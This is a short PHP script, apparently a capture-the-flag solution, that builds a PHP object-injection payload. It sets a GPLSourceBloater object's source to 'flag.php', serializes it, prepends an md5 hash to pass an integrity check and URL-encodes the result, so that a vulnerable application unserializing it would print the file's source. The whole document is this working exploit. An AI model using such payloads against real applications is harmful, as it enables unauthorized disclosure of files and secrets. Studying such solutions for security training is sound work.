<?php

Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true) . highlight_file($this->source, true);
    }
}

$foo = new GPLSourceBloater();
$foo->source = 'flag.php';

$bar = [];
$bar[] = $foo;

$m = serialize($bar);
$h = md5($m);

echo urlencode($h.$m);

?>
